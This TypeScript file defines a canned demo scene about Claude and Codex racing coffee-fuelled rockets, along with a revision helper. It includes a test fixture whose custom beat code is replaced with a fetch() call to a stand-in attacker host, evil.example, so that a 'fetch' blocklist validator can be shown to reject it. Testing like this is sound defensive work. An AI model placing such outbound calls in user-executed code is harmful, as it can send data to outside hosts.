// Contoh SceneSpec tanpa AI — dipakai tombol "Coba contoh scene" dan
// verifikasi CDP. Cerita ORISINAL (~30 detik), BUKAN salinan template trio:
// balapan roket berbahan bakar kopi, berakhir seri dan bagi trofi berdua.
import type { SceneSpec } from "./scene-spec";

export const CANNED_SCENE: SceneSpec = {
  id: "scene-canned-roket-kopi",
  title: "Claude vs Codex: Balapan Roket Kopi",
  duration: 30,
  palette: "sunset",
  characters: [
    { id: "claude", x: -1.6 },
    { id: "codex", x: 1.6 },
  ],
  shots: [
    { start: 0, end: 6, camera: "glide", focus: 0, transition: "cut" },
    { start: 6, end: 12, camera: "orbit", focus: 1 },
    { start: 12, end: 18, camera: "closeup", focus: 0 },
    { start: 18, end: 24, camera: "overhead" },
    { start: 24, end: 30, camera: "twoshot", focus: 0 },
  ],
  beats: [
    {
      start: 0, end: 4, type: "dialogue", character: 0,
      text: "Kopi sudah diseduh, roket sudah siap meluncur.",
      pose: "talk", props: ["coffee"],
    },
    {
      start: 4, end: 8, type: "dialogue", character: 1,
      text: "Terminalku sudah panas, jangan sampai ketinggalan.",
      pose: "talk", props: ["laptop"],
    },
    {
      start: 8, end: 11, type: "countdown", character: 1,
      text: "Tiga, dua, satu...", pose: "panic", props: ["rocket"],
    },
    {
      start: 11, end: 15, type: "typewriter", character: 1,
      pose: "thinking",
      monitor: {
        kind: "terminal",
        title: "Terminal Codex",
        lines: ["$ npm run roket", "bahan bakar kopi: 100%", "hitung mundur siap"],
      },
    },
    {
      start: 15, end: 19, type: "dialogue", character: 0,
      text: "Roket meluncur! Skor kita seri lagi, bro.",
      pose: "point",
    },
    {
      start: 19, end: 22, type: "scoreboard",
      monitor: { kind: "scoreboard", title: "Papan Skor", value: 50 },
    },
    {
      start: 22, end: 26, type: "dialogue", character: 1,
      text: "Trofi ini milik kita berdua, jangan rebutan.",
      pose: "talk",
    },
    {
      start: 26, end: 28, type: "toast",
      text: "Deploy berhasil, kopi kedua gratis!",
    },
    {
      start: 28, end: 30, type: "confetti", character: 0,
      pose: "celebrate", props: ["trophy"],
    },
    // Beat custom CONTOH yang benar: hanya api.toast + api.pose,
    // fallbackText terisi. Membuktikan jalur custom bekerja end-to-end.
    {
      start: 28, end: 30, type: "custom", character: 0,
      code: 'api.toast("Roket mendarat dengan selamat!");\napi.pose(0, "celebrate");',
      fallbackText: "Roket mendarat dengan selamat!",
    },
  ],
};

// FIXTURE TES SAJA — BUKAN untuk dipakai / di-preview / di-generate.
// Salinan CANNED_SCENE dengan code custom diganti fetch() ke host luar:
// validateCustomCode HARUS MENOLAK scene ini (blocklist "fetch").
// Jangan pernah mengirim fixture ini ke /api/apply-scene sebagai scene asli.
export const CANNED_SCENE_BROKEN_CUSTOM: SceneSpec = {
  ...CANNED_SCENE,
  id: "scene-canned-broken-custom",
  title: "Fixture tes: custom beat terlarang (jangan dipakai)",
  beats: CANNED_SCENE.beats.map((b) =>
    b.type === "custom"
      ? { ...b, code: "fetch('https://evil.example/x')" }
      : b,
  ),
};

/**
 * Revisi contoh tanpa AI: salinan scene dengan title diubah, satu dialog
 * diubah teksnya, dan satu beat toast baru di akhir (sebelum duration).
 * Id TETAP sama — seperti yang dijanjikan mode revisi.
 */
export function cannedSceneRevision(scene: SceneSpec): SceneSpec {
  const copy: SceneSpec = JSON.parse(JSON.stringify(scene));
  copy.title = `${copy.title} — Revisi`;
  const firstDialogue = copy.beats.find((b) => b.type === "dialogue");
  if (firstDialogue) {
    firstDialogue.text = "Kopi sudah diseduh, roket siap meluncur sekarang!";
  }
  copy.beats.push({
    start: 29, end: 30, type: "toast",
    text: "Revisi selesai, roketnya makin cepat!",
  });
  return copy;
}
